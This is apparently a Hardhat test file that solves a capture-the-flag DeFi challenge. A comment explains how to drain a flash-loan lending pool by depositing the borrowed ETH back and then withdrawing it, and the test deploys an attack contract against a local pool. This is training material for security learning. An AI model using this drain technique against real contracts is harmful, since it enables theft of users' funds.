const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Side entrance', function () {

    let deployer, attacker;

    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const SideEntranceLenderPoolFactory = await ethers.getContractFactory('SideEntranceLenderPool', deployer);
        this.pool = await SideEntranceLenderPoolFactory.deploy();
        
        await this.pool.deposit({ value: ETHER_IN_POOL });

        this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);

        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.equal(ETHER_IN_POOL);
    });

    /**
     * @dev
     * Exploit Overview:
     * 
     * This exploit utilises the deposit function of the lending contract.
     * Since the flashloan checks after the execution is complete if the funds 
     * were returned or not we need to make sure the funds are back in the contract 
     * after execution.
     * 
     * However, since we can deposit ETH back into the pool it then is marked under
     * our address and is withdrawable. 
     * 
     * So exploit goes like this
     * 
     * 1. Request Flash Loan with all tokens in the pool
     * 2. Get call back and deposit ETH back into the pool via the deposit() function
     * 3. Let the flash loan complete since the ETH has been returned to the contract
     * 4. Call the withdraw() function on the contract to retrieve deposited ETH
     * 5. On payment transfer all funds to attacker address
     * 
     * Exploit contract is located at:
     * "contracts/attacker-contracts/AttackSideEntrance.sol"
     */
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        const AttackFactory = await ethers.getContractFactory("AttackSideEntrance", attacker);
        const attackContract = await AttackFactory.deploy(this.pool.address);

        await attackContract.attack(ETHER_IN_POOL);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal('0');
        
        // Not checking exactly how much is the final balance of the attacker,
        // because it'll depend on how much gas the attacker spends in the attack
        // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(this.attackerInitialEthBalance);
    });
});
